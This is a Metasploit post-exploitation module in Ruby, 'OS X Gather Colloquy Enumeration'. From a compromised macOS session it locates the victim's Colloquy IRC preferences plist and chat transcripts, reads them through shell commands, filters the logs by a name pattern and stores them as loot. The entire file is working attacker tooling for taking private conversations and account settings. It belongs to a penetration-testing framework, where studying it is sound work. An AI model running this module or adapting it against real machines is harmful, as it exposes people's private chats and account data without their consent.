##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'OS X Gather Colloquy Enumeration',
        'Description' => %q{
          This module will collect Colloquy's info plist file and chat logs from the
          victim's machine.  There are three actions you may choose:  INFO, CHATS, and
          ALL.  Please note that the CHAT action may take a long time depending on the
          victim machine, therefore we suggest to set the regex 'PATTERN' option in order
          to search for certain log names (which consists of the contact's name, and a
          timestamp).  The default 'PATTERN' is configured as "^alien" as an example
          to search for any chat logs associated with the name "alien".
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'sinn3r'],
        'Platform' => [ 'osx' ],
        'SessionTypes' => [ 'meterpreter', 'shell' ],
        'Actions' => [
          ['ACCOUNTS', { 'Description' => 'Collect the preferences plists' } ],
          ['CHATS', { 'Description' => 'Collect chat logs with a pattern' } ],
          ['ALL', { 'Description' => 'Collect both the plists and chat logs' }]
        ],
        'DefaultAction' => 'ALL',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptRegexp.new('PATTERN', [true, 'Match a keyword in any chat log\'s filename', '^alien']),
      ]
    )
  end

  #
  # Parse a plst file to XML format:
  # https://web.archive.org/web/20141112034745/http://hints.macworld.com/article.php?story=20050430105126392
  #
  def plutil(filename)
    exec("plutil -convert xml1 #{filename}")
    exec("cat #{filename}")
  end

  def get_chatlogs(base)
    chats = []

    # Get all the logs
    print_status("#{@peer} - Download logs...")
    folders = dir("\"#{base}\"")
    folders.each do |f|
      # Get all the transcripts from this folder
      trans = exec("find \"#{base}#{f}\" -name *.colloquyTranscript")
      trans.split("\n").each do |t|
        fname = ::File.basename(t)
        # Check fname before downloading it
        next if fname !~ datastore['PATTERN']

        print_status("#{@peer} - Downloading #{t}")
        content = exec("cat \"#{t}\"")
        chats << { log_name: fname, content: content }
      end
    end

    return chats
  end

  def get_preferences(path)
    raw_plist = exec("cat #{path}")
    return nil if raw_plist =~ /No such file or directory/

    xml_plist = plutil(path)
    return xml_plist
  end

  def save(type, data)
    case type
    when :preferences
      p = store_loot(
        'colloquy.preferences',
        'text/plain',
        session,
        data,
        'info.colloquy.plist'
      )
      print_good("#{@peer} - info.colloquy.plist saved as: #{p}")

    when :chatlogs
      data.each do |d|
        log_name = d[:log_name]
        content = d[:content]

        p = store_loot(
          'colloquy.chatlogs',
          'text/plain',
          session,
          content,
          log_name
        )
        print_good("#{@peer} - #{log_name} stored in #{p}")
      end
    end
  end

  def whoami
    exec('/usr/bin/whoami')
  end

  def dir(path)
    subdirs = exec("ls -l #{path}")
    return [] if subdirs =~ /No such file or directory/

    items = subdirs.scan(/[A-Z][a-z][a-z]\x20+\d+\x20[\d:]+\x20(.+)$/).flatten
    return items
  end

  def exec(cmd)
    tries = 0
    begin
      cmd_exec(cmd).chomp
    rescue ::Timeout::Error => e
      tries += 1
      if tries < 3
        vprint_error("#{@peer} - #{e.message} - retrying...")
        retry
      end
    rescue EOFError => e
      tries += 1
      if tries < 3
        vprint_error("#{@peer} - #{e.message} - retrying...")
        retry
      end
    end
  end

  def run
    if action.nil?
      print_error('Please specify an action')
      return
    end

    @peer = "#{session.session_host}:#{session.session_port}"
    user = whoami

    # Examples:
    # /Users/[user]/Library/Preferences/info.colloquy.plist
    # /Users/[user]/Documents/Colloquy Transcripts
    # /Users/[user]/Documents/Colloquy Transcripts//[server]/[contact] 10-13-11.colloquyTranscript
    transcripts_path = "/Users/#{user}/Documents/Colloquy Transcripts/"
    prefs_path = "/Users/#{user}/Library/Preferences/info.colloquy.plist"

    prefs = get_preferences(prefs_path) if action.name =~ /ALL|ACCOUNTS/i
    chatlogs = get_chatlogs(transcripts_path) if action.name =~ /ALL|CHATS/i

    save(:preferences, prefs) if !prefs.nil? && !prefs.empty?
    save(:chatlogs, chatlogs) if !chatlogs.nil? && !chatlogs.empty?
  end
end
